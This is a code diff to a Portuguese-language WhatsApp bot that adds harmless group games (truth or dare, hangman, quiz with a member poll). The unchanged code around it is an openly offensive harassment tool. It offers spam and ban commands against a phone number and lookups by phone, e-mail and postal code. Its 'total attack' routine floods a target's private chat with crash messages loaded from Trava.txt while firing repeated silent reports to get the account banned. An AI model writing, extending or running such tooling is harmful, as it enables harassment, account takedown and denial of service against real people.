@@ -22,9 +22,10 @@ let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
 
-// Banco de dados em memória para Níveis e Configurações de Grupo
+// Banco de dados em memória para Níveis, Configurações de Grupo e Estado de Brincadeiras
 const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
 const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
+const sessoesBrincadeira = {}; // { 'idGrupo': { ativa: true, tipo: '...', lote: [] } }
 
 function consultarAPI(url) {
     return new Promise((resolve) => {
@@ -191,6 +192,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /telefone <telefone>\n` +
                     `> /email <e-mail>\n` +
                     `> /cep <cep>\n` +
+                    `╠━━━⧼🎮 BRINCADEIRAS IA⧽\n` +
+                    `> /brincar (Abre o menu)\n` +
+                    `> /para (Encerra a brincadeira)\n` +
                     `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                     `> /SP4M <número> <qtd>\n` +
                     `> /B4N <número> <qtd>\n` +
@@ -223,6 +227,63 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     });
                 } else {
                     await waSock.sendMessage(remoteJid, { text: menuTexto });
+                }
+            }
+            // COMANDO DE BRINCADEIRAS (MENU)
+            else if (texto.trim() === '/brincar') {
+                const menuBrincadeiras = 
+                    `🎮 *ZRX - PAINEL DE BRINCADEIRAS* 🎮\n\n` +
+                    `Escolha e digite o nome exato da brincadeira que deseja iniciar:\n\n` +
+                    `👉 \`Verdade ou desafio\`\n` +
+                    `👉 \`Jogo da forca\`\n` +
+                    `👉 \`Pergunta e resposta\`\n\n` +
+                    `_Para encerrar a qualquer momento, envie:_ \`/para\``;
+
+                await waSock.sendMessage(remoteJid, { text: menuBrincadeiras });
+            }
+            // COMANDO PARA PARAR A BRINCADEIRA
+            else if (texto.trim() === '/para') {
+                if (sessoesBrincadeira[remoteJid]) {
+                    delete sessoesBrincadeira[remoteJid];
+                    await waSock.sendMessage(remoteJid, { text: `🛑 *Brincadeira encerrada com sucesso!* Até a próxima.` });
+                } else {
+                    await waSock.sendMessage(remoteJid, { text: `⚠️ Não há nenhuma brincadeira ativa neste chat.` });
+                }
+            }
+            // SELEÇÃO DA BRINCADEIRA (Verdade ou desafio, Jogo da forca, Pergunta e resposta)
+            else if (['verdade ou desafio', 'jogo da forca', 'pergunta e resposta'].includes(texto.trim().toLowerCase())) {
+                const tipoEscolhido = texto.trim().toLowerCase();
+
+                if (!remoteJid.endsWith('@g.us')) {
+                    await waSock.sendMessage(remoteJid, { text: `❌ Este comando de brincadeira em grupo deve ser usado dentro de um grupo!` });
+                    return;
+                }
+
+                await waSock.sendMessage(remoteJid, { text: `🔄 Iniciando a brincadeira: *${texto.trim()}*!\n_Aguarde, gerando votação de participantes e consultando a Meta AI..._` });
+
+                sessoesBrincadeira[remoteJid] = {
+                    ativa: true,
+                    tipo: tipoEscolhido,
+                    lote: [
+                        `[Exemplo gerado via Meta AI] Pergunta 1 para ${tipoEscolhido}: Qual o seu maior sonho secreto?`,
+                        `[Exemplo gerado via Meta AI] Pergunta 2 para ${tipoEscolhido}: Descreva algo inusitado que aconteceu esta semana.`
+                    ]
+                };
+
+                // Criação da votação nativa (Poll) para escolher quem começa
+                try {
+                    const metadata = await waSock.groupMetadata(remoteJid);
+                    const participantes = metadata.participants.slice(0, 10).map(p => p.id.split('@')[0]); // Pega até 10 membros para as opções da enquete
+                    
+                    await waSock.sendMessage(remoteJid, {
+                        poll: {
+                            name: `🗳️ Quem deve começar a rodada de ${tipoEscolhido}?`,
+                            values: participantes.map(num => `+${num}`),
+                            selectableCount: 1
+                        }
+                    });
+                } catch (e) {
+                    await waSock.sendMessage(remoteJid, { text: `✅ Brincadeira configurada! Enviando a primeira questão do lote...\n\n${sessoesBrincadeira[remoteJid].lote[0]}` });
                 }
             }
             else if (texto.startsWith('/ip ')) {
@@ -392,7 +453,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                                 fromMe: false,
                                 remoteJid: idGrupo
                             });
-                            await delay(300); // Velocidade otimizada para grande volume
+                            await delay(300);
                         } catch (e) {}
                     }
 
@@ -455,7 +516,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });
 
-                // 1. Carrega a trava local (Trava.txt)
                 let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
                 if (fs.existsSync(caminhoPayload)) {
@@ -463,7 +523,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
-                // Tarefa 1: Envia as travas pesadas para o chat privado do alvo
                 const tarefaTrava = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -473,7 +532,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos, 100% silenciosa no chat)
                 const tarefaDenunciaNativa = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -490,7 +548,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Executa as duas tarefas em paralelo absoluto
                 await Promise.all([tarefaTrava, tarefaDenunciaNativa]);
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
